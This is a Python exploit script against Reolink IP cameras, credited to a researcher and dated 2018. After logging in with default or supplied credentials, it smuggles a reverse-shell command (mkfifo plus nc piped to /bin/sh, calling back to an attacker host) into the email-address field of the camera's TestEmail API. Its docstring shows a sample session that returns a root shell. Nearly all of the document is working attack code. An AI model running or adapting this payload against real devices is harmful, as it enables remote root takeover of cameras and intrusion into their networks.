#!/usr/bin/env python2.7
# [SOF]
#
# Subject: Reolink {IPC} RCE (2018 bashis)
#
# Attack vector: Remote
# Authentication: Authenticated
# Researcher: bashis <mcw noemail eu>
#
#
"""
$ ./Reolink-IPC-RCE.py --rhost 192.168.57.20 --rport 80 --lhost 192.168.57.1 --lport 1337 --auth admin:pwn

Reolink {IPC} RCE (2018 bashis)

[i] Remote target IP: 192.168.57.20
[i] Remote target PORT: 80
[i] Connect back IP: 192.168.57.1
[i] Connect back PORT: 1337
[>] Sending: Login, Creds: admin:pwn
[<] cmd: Login, token: 60cd6569207ed11
[>] Sending: TestEmail RCE
[<] cmd: TestEmail, result: 200
[>] Sending: Logout
[<] cmd: Logout, result: 200
[i] All done


[Listener]
$ ncat -vlp 1337
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B975 F261 BA42 C65D 9FDD 9BF9 BD2B B8C7 07FC F253
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.57.20.
Ncat: Connection from 192.168.57.20:36668.
pwd
/mnt/app
id
uid=0(root) gid=0(root)
exit
$
"""
import socket
import sys
import urllib, urllib2, httplib
import ssl
import argparse
import base64
import os
import sys
import json

class HTTPconnect:

	def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = credentials
		self.Raw = Raw
		self.noexploit = noexploit
	
	def Send(self, uri, query_headers, query_data, ID):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID

		# Connect-timeout in seconds
		timeout = 10
		socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			print "[Verbose] Sending:", url

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				print "[i] Creating SSL Unverified Context"
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				print "[!] Basic Auth Error:",e
				sys.exit(1)

		if self.noexploit and not self.verbose:
			print "[<] 204 Not Sending!"
			html =  "Not sending any data"
			return html
		else:
			if self.query_data:
				req = urllib2.Request(url, self.query_data, headers=self.query_headers)
			else:
				req = urllib2.Request(url, None, headers=self.query_headers)
			try:
				rsp = urllib2.urlopen(req)
			except Exception as e:
				print "[<] {}".format(str(e))
				return False

		if self.Raw:
			return rsp
		else:
			html = rsp.read()
			return html

#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid FQDN, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False

if __name__ == "__main__":

	INFO =  '\nReolink {IPC} RCE (2018 bashis)\n'

	rhost = '192.168.57.20'	# Default Remote HOST
	rport = '80'			# Default Remote PORT
	lhost = '192.168.57.1'	# Default Local HOST
	lport = '1337'			# Default Local PORT

	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	noexploit = False
	raw_request = True
	credentials = "admin:123456"	# Default l/p
#	credentials = None

	headers = {
		'Connection': 'close',
		'Content-Type'	:	'application/x-www-form-urlencoded',
		'Accept'	:	'gzip, deflate',
		'Accept-Language'	:	'en-US,en;q=0.8',
		'Cache-Control'	:	'max-age=0',
		'User-Agent':'REOLINK/1.0'
		}

	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')

		if credentials:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: {}\n".format(str(e))
		sys.exit(1)

	print INFO

	if args.verbose:
		verbose = True

	if credentials and args.auth:
		credentials = args.auth

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if LPORT is valid
	if not Validate(verbose).Port(lport):
		print "[!] Invalid LPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print "[!] Invalid LHOST"
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	print "[i] Remote target IP:",rhost
	print "[i] Remote target PORT:",rport
	print "[i] Connect back IP:",lhost
	print "[i] Connect back PORT:",lport

	remote_host = rhost+':'+rport

	LOGIN = [
				{
				"cmd":"Login",
				"action":0,
				"param":{
					"User":{
						"userName":credentials.split(":")[0],
						"password":credentials.split(":")[1]
							}
						}
				}
			]

	LOGOUT = [
				{
				"cmd":"Logout",
				"action":0,
				"param":{}
				}
			]

	RCE_CMD = '$(mkfifo /mnt/tmp/s;nc LHOST LPORT </mnt/tmp/s|/bin/sh>/mnt/tmp/s 2>&1 ; rm -f /mnt/tmp/s)&' # Let's fork()
	RCE_CMD = RCE_CMD.replace('LHOST',lhost).replace('LPORT',lport)
	RCE = [
			{
				"cmd":"TestEmail",
				"action":1,
				"param":{
					"Email":{
						"smtpServer":"smtp.gmail.com",
						"nickName":"",
						"smtpPort":465,
						"userName":"pwn@reolink.com",
						"password":"",
						"addr1":RCE_CMD,
						"addr2":"",
						"addr3":"",
						"interval":"5 Minutes",
						"ssl":1,
						"attachment":"picture"
							}
						}
				}
			]

	#
	# Login
	#
	print "[>] Sending: Login, Creds: {}".format(credentials)
	URI = '/cgi-bin/api.cgi?cmd=Login&token=null'
	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGIN),None)
	if response:
		JSON = json.loads(response)
		if verbose:
			print json.dumps(JSON,indent=4)

		if JSON[0]['code'] != 0:
			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
			print "[!] Exit"
			sys.exit(1)
	else:
		print response
		sys.exit(1)
	token = JSON[0]['value']['Token']['name']
	print "[<] cmd: {}, token: {}".format(JSON[0]['cmd'],token)

	#
	# RCE
	#
	print "[>] Sending: TestEmail RCE"
	URI = '/cgi-bin/api.cgi?cmd=TestEmail&file=config-file&token=' + token
	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(RCE),None)
	if response:
		JSON = json.loads(response)
		if verbose:
			print json.dumps(JSON,indent=4)

		if JSON[0]['code'] != 0:
			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
			print "[>] Sending: Logout"
			URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token
			response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None)
			if response:
				JSON = json.loads(response)
				if verbose:
					print json.dumps(JSON,indent=4)

				if JSON[0]['code'] != 0:
					print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
					print "[!] Exit"
					sys.exit(1)
			else:
				print response
				sys.exit(1)
			print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])

			print "[!] Exit"
			sys.exit(1)
	else:
		print response
		sys.exit(1)
	print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])

	#
	# Logout
	#
	print "[>] Sending: Logout"
	URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token
	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None)
	if response:
		JSON = json.loads(response)
		if verbose:
			print json.dumps(JSON,indent=4)

		if JSON[0]['code'] != 0:
			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
			print "[!] Exit"
			sys.exit(1)
	else:
		print response
		sys.exit(1)
	print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])

	print "[i] All done"

# [EOF]

